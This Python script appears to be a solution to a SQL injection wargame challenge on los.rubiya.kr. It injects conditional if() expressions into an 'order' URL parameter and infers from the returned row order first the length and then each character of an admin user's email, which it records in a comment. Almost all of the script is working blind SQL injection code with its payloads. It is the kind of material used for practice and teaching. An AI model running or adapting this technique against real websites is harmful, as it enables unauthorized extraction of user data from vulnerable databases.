from requests import Session, request

URL = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}

EmailLength = 0
FLAG = ""



def lengthEmail():
    global EmailLength
    for i in range(1, 40):  # if((id=%27admin%27%20and%20length(email)=28),score,9999)%23
        payload = f"?order=if((id=%27admin%27 and length(email)={i}),score,9999)%23"
        res = request(method='GET', url=URL + payload, cookies=session)
        print(f"[*] in progress {i}/{payload}")

        if "</td><td>200</td></tr><tr><td>rubiya</td>" in res.text:
            print("Find !! email length is ::", i)
            EmailLength = i
            """
            rubiya: 18
            admin: 28
            """
            break


def getEmail():
    global EmailLength
    global FLAG

    for i in range(1, EmailLength + 1):
        for j in range(33, 127):
            # print(i, j)
            payload = f"?order=if((id=%27admin%27 and ascii(substr(email,{i},1))={j}),score,9999)%23"
            res = request(method='GET', url=URL + payload, cookies=session)
            print(f"[*] in progress {(i,j)}/{payload}")

            if "</td><td>200</td></tr><tr><td>rubiya</td>" in res.text:
                FLAG = FLAG + chr(j)
                print(f"Find !! email[{str(i)}] is :: {chr(j)} ||| {FLAG}")
                break

        if FLAG == "":
            print("Not Correct payload...")
            break


    print(f"email :: {FLAG}")


if __name__ == '__main__':
    lengthEmail()
    getEmail()
    # email :: admin_secure_email@emai1.com
